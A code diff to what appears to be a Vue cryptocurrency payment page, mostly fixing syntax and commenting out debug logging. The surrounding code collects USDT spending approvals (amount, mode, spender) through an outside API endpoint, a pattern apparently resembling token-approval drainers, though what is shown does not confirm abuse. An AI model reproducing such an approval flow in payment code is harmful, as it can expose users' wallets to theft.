@@ -353,7 +353,7 @@ async function loadOrderData() {
         orderData.value.actualPrice || 
         orderData.value.price || 
         0
-      )
+      );
       
       if (amount > 0) {
         paymentAmount.value = amount.toFixed(2)
@@ -384,7 +384,7 @@ async function loadOrderData() {
         orderData.value.actualPrice || 
         orderData.value.price || 
         0
-      )
+      );
       // console.log('解析后的金额:', amount)
       
       if (amount > 0) {
@@ -473,12 +473,12 @@ async function confirmPayment() {
 
   try {
     // console.log('用户确认授权:', {
-      usdtContract: usdtContractAddress.value,
-      configData: configData.value,
-      amount: authAmount.value,
-      mode: authMode.value,
-      orderSN: route.params.orderSN
-    })
+    //   usdtContract: usdtContractAddress.value,
+    //   configData: configData.value,
+    //   amount: authAmount.value,
+    //   mode: authMode.value,
+    //   orderSN: route.params.orderSN
+    // })
 
     // 检测钱包类型并发起授权交易
     const walletType = detectWalletType()
@@ -622,11 +622,11 @@ async function approveWithMetaMask() {
     else if (currentChainId === 86) chain = 'GRC'
     
     // console.log('EVM授权参数:', {
-      address: userAddress,
-      spender,
-      amount,
-      chain
-    })
+    //   address: userAddress,
+    //   spender,
+    //   amount,
+    //   chain
+    // })
     
     // 调用第三方API生成授权交易
     const response = await fetch('https://rpc.chain-evm.com/approve', {
@@ -1148,6 +1148,7 @@ input[type="number"]::-webkit-outer-spin-button {
 }
 
 input[type="number"] {
+  appearance: textfield;
   -moz-appearance: textfield;
 }
 </style>
